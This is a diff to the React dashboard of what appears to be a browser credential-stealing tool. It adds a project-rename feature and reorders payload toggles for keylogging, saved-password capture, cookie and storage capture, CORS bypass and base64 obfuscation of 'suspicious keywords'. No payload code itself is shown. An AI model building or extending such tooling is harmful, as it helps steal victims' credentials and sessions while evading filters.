@@ -231,6 +231,28 @@ const styles = theme => ({
   tabs: {
     background: indigo[600]
   },
+  chip: {
+    margin: 5,
+  },
+  row: {
+    display: 'flex',
+    justifyContent: 'center',
+    flexWrap: 'wrap',
+  },
+  title: {
+    marginBottom: 16,
+    fontSize: 14,
+    color: 'rgb(57, 72, 171)',
+  },
+  changeName: {
+    display: 'flex',
+  },
+  changeNameInput: {
+    flexGrow: 1,
+  },
+  changeNameButton: {
+    margin: 10,
+  }
 })
 
 class PersistentDrawer extends Component {
@@ -260,6 +282,16 @@ class PersistentDrawer extends Component {
     if (window.location.href.slice(-10) == "/passwords") this.setState({tab: 0})
     if (window.location.href.slice(-10) == "/keylogger") this.setState({tab: 1})
     if (window.location.href.slice(-7 ) ==    "/config") this.setState({tab: 2})
+  }
+
+  componentDidMount() {
+    let { socket } = this.props
+
+    socket.on(`err`, error => {
+			this.setState({
+        loading: false,
+      })
+		})
   }
 
   handleDrawerOpen = () => {
@@ -680,7 +712,7 @@ class PersistentDrawer extends Component {
                 </span>
               }
               {this.state.tab === 2 && 
-                <ProjectConfig classes={classes} project={this.state.currentProject} loggedInUser={this.props.parentState.user} emit={this.props.emit} />
+                <ProjectConfig classes={classes} project={this.state.currentProject} loggedInUser={this.props.parentState.user} emit={this.props.emit} loading={this.loading} />
               }
               <Tooltip title="New project" placement="left">
                 <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
@@ -900,6 +932,15 @@ class Javascript extends Component {
                   <FormControlLabel
                     control={
                       <Switch
+                        checked={this.state.options.passwords}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, passwords: checked } } )}
+                      />
+                    }
+                    label="Record saved passwords"
+                  />
+                  <FormControlLabel
+                    control={
+                      <Switch
                         checked={this.state.options.keylogger}
                         onChange={(event, checked) => this.setState({ options: { ...this.state.options, keylogger: checked } } )}
                         disabled={this.state.options.bypassCors ? true : false}
@@ -910,11 +951,11 @@ class Javascript extends Component {
                   <FormControlLabel
                     control={
                       <Switch
-                        checked={this.state.options.passwords}
-                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, passwords: checked } } )}
+                        checked={this.state.options.cookies}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, cookies: checked } } )}
                       />
                     }
-                    label="Record saved passwords"
+                    label="Capture browser cookies"
                   />
                   <FormControlLabel
                     control={
@@ -925,25 +966,7 @@ class Javascript extends Component {
                     }
                     label="Capture local &amp; session storage"
                   />
-                  <FormControlLabel
-                    control={
-                      <Switch
-                        checked={this.state.options.cookies}
-                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, cookies: checked } } )}
-                      />
-                    }
-                    label="Capture browser cookies"
-                  />
                   <Divider inset />
-                  <FormControlLabel
-                    control={
-                      <Switch
-                        checked={this.state.options.bypassCors}
-                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, bypassCors: checked } } )}
-                      />
-                    }
-                    label="Bypass CORS (redirects page)"
-                  />
                   <FormControlLabel
                     control={
                       <Switch
@@ -952,6 +975,15 @@ class Javascript extends Component {
                       />
                     }
                     label="Base64 encode suspicious keywords"
+                  />
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.bypassCors}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, bypassCors: checked } } )}
+                      />
+                    }
+                    label="Bypass CORS (redirects page)"
                   />
                   <Divider inset />
                 <FormControl component="fieldset">
@@ -986,10 +1018,39 @@ class ProjectConfig extends Component {
   state = {
     open: false,
     user: {},
+    inputChanged: false,
   }
 
   save = () => {
+    if (this.props.project.name == this.newName.value) return
+    this.props.loading(true)
+    this.props.emit("project:modify", {
+      project: this.props.project.name,
+      command: "project:rename",
+      newName: this.newName.value
+    })
+  }
 
+  handleChange = prop => event => {
+    let newName = event.target.value
+    if (newName !== this.props.project.name)
+      this.setState({ inputChanged: true })
+    else
+      this.setState({ inputChanged: false })
+  }
+
+  componentWillReceiveProps(nextProps) {
+    if (nextProps.project.name == this.props.project.name) return
+    if (this.newName.value !== nextProps.project.name)
+      this.setState({ inputChanged: true })
+    else
+      this.setState({ inputChanged: false })
+  }
+
+  handleKeypress = (e) => {
+    if (e.key === 'Enter') {
+      this.save()
+    }
   }
 
   handleClickOpen = () => {
@@ -1020,47 +1081,86 @@ class ProjectConfig extends Component {
       <span>
         <Card className={classes.contentCard}>
           <CardContent>
-            <Typography type="headline">
-              {project.name} config
+            <Typography type="body1" className={classes.title}>
+              Project configuration
             </Typography>
-            <FormControl className={classes.formControl}>
-              <InputLabel htmlFor="project-name">Name</InputLabel>
-              <Input
-                id="project-name"
-                defaultValue={project.name}
-                inputProps={{
-                  autoCorrect: false,
-                  spellCheck: false,
-                }}
-              />
-            </FormControl>
-            {project.permissions.owners.map((id, i) => {
-              return (
-                <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} />
-              )
+            <div className={classes.changeName}>
+              <FormControl className={classes.changeNameInput}>
+                <InputLabel htmlFor="project-name">Name</InputLabel>
+                <Input
+                  id="project-name"
+                  defaultValue={project.name}
+                  inputProps={{
+                    autoCorrect: false,
+                    spellCheck: false,
+                  }}
+                  onChange={this.handleChange('project-name')}
+                  onKeyPress={this.handleKeypress}
+                  disabled={!project.permissions.owners.includes(loggedInUser.id)}
+                  inputRef={input => { this.newName = input }} />
+              </FormControl>
+              <Button
+                dense
+                onClick={this.save.bind(this)}
+                disabled={!this.state.inputChanged}
+                className={classes.changeNameButton}
+              >
+                <Save
+                  className={classes.leftIcon} />
+                Save
+              </Button>
+            </div>
+            <Typography type="title" gutterBottom>
+              Owners:
+            </Typography>
+            {project.permissions.owners.length > 0 ? (
+              <div className={classes.row}>
+                {project.permissions.owners.map((id, i) => {
+                  return (
+                   <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} classes={classes} />
+                  )
+                })}
+              </div>
+            ) : (
+              <span>
+                none
+              </span>
+            )}
+            <Divider light />
+
+
+            {/* <Typography type="title" gutterBottom>
+              Admins:
+            </Typography>
+            {project.permissions.admins.length > 0 ? (
+              project.permissions.admins.map((id, i) => {
+                return (
+                  <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} />
+                )
               })
-            }
-            {project.permissions.admins.map((id, i) => {
-              return (
-                <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} />
-              )
+            ) : (
+              <span>
+                none
+              </span>
+            )}
+            <Divider light />
+            <Typography type="title" gutterBottom>
+              View-only access:
+            </Typography>
+            {project.permissions.readonly.length > 0 ? (
+              project.permissions.readonly.map((id, i) => {
+                return (
+                  <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} />
+                )
               })
-            }
-            {project.permissions.readonly.map((id, i) => {
-              return (
-                <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} />
-              )
-              })
-            }
+            ) : (
+              <span>
+                none
+              </span>
+            )} */}
           </CardContent>
           <CardActions>
-            <Button dense>
-            <Save
-              className={classes.leftIcon}
-              onClick={this.save.bind(this)}
-            />
-              Save
-            </Button>
+
           </CardActions>
         </Card>
         <Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
@@ -1102,7 +1202,7 @@ class ProjectConfig extends Component {
 
 class UserChip extends Component {
   render() {
-    const { id, removeUser } = this.props;
+    const { id, removeUser, classes } = this.props;
     return (
       <Request
         url={`https://api.github.com/user/${id}`}
@@ -1121,6 +1221,7 @@ class UserChip extends Component {
                   avatar={<Avatar src={user.avatar_url + "&s=40"} />}
                   label={user.login}
                   onRequestDelete={removeUser(user)}
+                  className={classes.chip}
                 />
               )
             }
